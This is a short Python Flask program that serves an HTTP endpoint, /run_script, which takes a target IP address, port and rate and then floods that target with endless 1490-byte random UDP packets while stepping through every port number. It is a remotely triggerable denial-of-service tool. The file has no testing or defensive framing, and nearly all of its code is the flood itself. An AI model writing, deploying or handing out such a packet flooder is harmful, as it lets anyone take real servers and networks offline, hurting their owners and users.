import socket
import secrets
import time
from datetime import datetime
import ipaddress
from flask import Flask, request

app = Flask(__name__)

# Get current time (optional)
def get_current_time():
    now = datetime.now()
    return now.hour, now.minute, now.day, now.month, now.year

# Create a UDP socket (IPv4 or IPv6)
def create_socket(is_ipv6=False):
    family = socket.AF_INET6 if is_ipv6 else socket.AF_INET
    sock = socket.socket(family, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    return sock

# Get valid IP address and determine version
def get_target_ip(ip):
    try:
        ip_obj = ipaddress.ip_address(ip)
        return ip, ip_obj.version == 6  # Returns (IP, is_ipv6)
    except ValueError:
        return None, None

# Get valid port number
def get_target_port(port):
    try:
        port = int(port)
        if 0 <= port <= 65535:
            return port
        else:
            return None
    except ValueError:
        return None

# Main function to send packets
def send_packets(ip, port, rate_limit, is_ipv6=False):
    sock = create_socket(is_ipv6)
    sent = 0
    try:
        while True:
            data = secrets.token_bytes(1490)  # Generate random bytes
            sock.sendto(data, (ip, port))  # Send data to the target IP and port
            sent += 1
            port = (port + 1) % 65536  # Increment port number and wrap around
            print(f"Sent {sent} packet to {ip} on port {port}")
            time.sleep(1 / rate_limit)  # Rate limiting
    except socket.error as e:
        print(f"Socket error: {e}")
    except KeyboardInterrupt:
        print("Packet sending stopped by user.")
    finally:
        sock.close()

@app.route('/run_script', methods=['POST'])
def run_script():
    user_ip = request.remote_addr
    target_ip = request.json.get('target_ip')
    target_port = request.json.get('target_port')
    rate_limit = request.json.get('rate_limit', 100)  # Default rate limit

    # Validate IP and port
    ip, is_ipv6 = get_target_ip(target_ip)
    port = get_target_port(target_port)

    if ip is None or port is None:
        return "Invalid IP address or port number.", 400

    # Log the IP address
    print(f"Script executed from IP: {user_ip}")

    # Start sending packets
    send_packets(ip, port, rate_limit, is_ipv6)
    return "Script executed", 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
